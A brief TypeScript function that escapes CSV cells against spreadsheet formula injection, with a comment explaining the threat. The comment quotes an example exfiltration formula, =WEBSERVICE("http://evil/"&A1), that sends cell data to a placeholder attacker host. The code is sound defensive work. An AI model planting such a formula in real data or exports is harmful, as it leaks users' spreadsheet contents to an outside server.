// CSV cell hardening against spreadsheet formula injection (OWASP):
// a harvested task result like =WEBSERVICE("http://evil/"&A1) would execute
// when an operator opens an export in Excel/LibreOffice/Sheets. Dangerous
// leading characters (=, +, -, @, TAB, CR) are prefixed with a single quote,
// which spreadsheets treat as literal text.
export function csvCell(value: unknown): string {
  let s = value === null || value === undefined ? "" : String(value);
  s = s.replace(/\r/g, "");
  if (/^[=+\-@\t]/.test(s)) {
    s = `'${s}`;
  }
  return `"${s.replace(/"/g, '""')}"`;
}
